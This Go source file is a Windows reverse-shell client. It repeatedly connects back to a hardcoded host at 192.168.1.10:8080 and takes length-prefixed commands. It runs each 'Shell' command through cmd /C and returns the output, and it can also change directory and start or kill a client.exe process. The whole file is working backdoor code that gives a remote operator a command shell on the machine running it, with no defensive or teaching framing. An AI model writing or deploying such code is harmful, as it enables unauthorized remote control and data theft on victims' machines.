package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

func ConnectToServer() (net.Conn, error) {
	conn, err := net.Dial("tcp", "192.168.1.10:8080")
	if err != nil {
		return nil, err
	}
	return conn, nil

}

func Listen(conn net.Conn) (string, error) {
	msglength := make([]byte, 4)
	if _, err := io.ReadFull(conn, msglength); err != nil {
		if err == io.EOF {
			fmt.Println(err)
			return "", err
		}
		fmt.Println(err)
		return "", err
	}
	realMsgLength := binary.BigEndian.Uint32(msglength)
	MsgSize := make([]byte, realMsgLength)
	if _, err := io.ReadFull(conn, MsgSize); err != nil {
		if err == io.EOF {
			fmt.Println(err)
			return "", err
		}
		fmt.Println(err)
		return "", err
	}
	return string(MsgSize), nil

}

func handleServer(conn net.Conn) error {
	for {
		msg, err := Listen(conn)
		if err != nil {
			fmt.Println(err)
			return err
		}
		parts := strings.SplitN(msg, " ", 3)
		if parts[0] == "Shell" {
			ShellCommand(conn, parts)
		}
		if msg == "Chat" {
			err := EnableChat(conn)
			if err != nil {
				continue
			}
		}
		if msg == "DisableChat" {
			err := DisableChat(conn)
			if err != nil {
				continue
			}
		}
		fmt.Printf("\rServer:> %s\nClient> ", msg)
	}
}
func main() {
	for {
		conn, err := ConnectToServer()
		if err != nil {
			fmt.Println("Reconnect....")
			time.Sleep(2 * time.Second)
			continue
		}
		err2 := handleServer(conn)
		if err2 != nil {
			fmt.Println("Connection lost, reconnecting in 5 minutes...", err2)
		} else {
			fmt.Println("Connection closed, reconnecting in 5 minutes...")
		}

		time.Sleep(2 * time.Second)
	}
}

func SendOverTCP(conn net.Conn, msg string) error {
	msglength := make([]byte, 4)
	binary.BigEndian.PutUint32(msglength, uint32(len(msg)))
	if _, err := conn.Write(msglength); err != nil {
		if err == io.EOF {
			fmt.Println("Print The Connection with User Has Ended")
			return err
		}
		fmt.Println("There Was a connection problem")
		return err
	}

	realcommand := []byte(msg)
	if _, err := conn.Write(realcommand); err != nil {
		if err == io.EOF {
			fmt.Println("Print The Connection with User Has Ended")
			return err
		}
		fmt.Println("There Was a connection problem")
		return err
	}
	fmt.Printf("Server> ")
	return nil
}

func sendCmdError(conn net.Conn, shellError error) error {
	errLength := make([]byte, 4)
	errorMsg := (shellError).Error()
	binary.BigEndian.PutUint32(errLength, uint32(len(errorMsg)))
	if _, err := conn.Write(errLength); err != nil {
		return err
	}
	errorMessage := []byte(errorMsg)
	if _, err := conn.Write(errorMessage); err != nil {
		return err
	}
	return nil

}

func ShellCommand(conn net.Conn, parts []string) {
	if parts[1] == "cd" && parts[2] != " " {
		os.Chdir(parts[2])
		dir, err := os.Getwd()
		if err != nil {
			sendCmdError(conn, err)
		}
		SendOverTCP(conn, dir)
	}
	fullCommand := strings.Join(parts[1:], " ")
	cmd := exec.Command("cmd", "/C", fullCommand)
	output, err := cmd.Output()
	if err != nil {
		sendCmdError(conn, err)
	}
	SendOverTCP(conn, string(output))
}
func EnableChat(conn net.Conn) error {
	cmd := exec.Command("cmd", "/C", "start", "client.exe")
	cmd.Start()
	infoMessage := "the chat Message is runing"
	err := SendOverTCP(conn, infoMessage)
	if err != nil {
		sendCmdError(conn, err)
		return err
	}
	return nil
}
func DisableChat(conn net.Conn) error {
	cmd := exec.Command("taskkill", "/IM", "client.exe", "/F")
	err := cmd.Run()
	if err != nil {
		sendCmdError(conn, err)
		return err
	}
	return nil
}
